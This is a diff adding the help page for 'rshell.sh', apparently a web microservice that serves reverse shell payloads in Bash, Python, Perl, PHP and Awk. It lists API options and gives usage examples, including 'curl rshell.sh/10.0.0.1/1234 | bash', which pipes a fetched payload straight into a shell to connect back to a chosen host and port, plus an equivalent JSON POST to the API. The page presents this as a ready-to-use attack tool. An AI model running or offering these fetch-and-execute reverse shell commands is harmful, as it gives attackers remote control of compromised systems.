@@ -1,0 +1,45 @@
+
+		rshell.sh - Help Page
+
+	Reverse Shell Payload Microservice
+
+* Python Shell Reset
+
+	curl -s rshell.sh/reset
+
+* Supported Languages
+
+	- Bash
+	- Python (3)
+	- Perl
+	- PHP
+	- Awk
+
+* GET Parameter(s)
+
+	- Description:
+		Output wrapped in single quotes.
+
+	- Example:
+		rshell.sh/10.0.0.1/1234?q=y	
+
+* API Options
+
+	- host:	IPv4_ADDRESS
+	- port: PORT_NUMBER
+	- lang: See, Supported Languages
+
+* Examples
+
+	- Basic Usage:
+		curl rshell.sh/10.0.0.1/1234 | bash
+
+	- API:
+		curl -sd '{"host":"10.0.0.1", "port":1234, "lang":"bash"}' -H "Content-Type: application/json" -X POST  https://rshell.sh/api
+
+* Links
+
+	- Live Site: https://rshell.sh
+	- Github: https://github.com/BlueSquare23/Rshell.sh
+
+
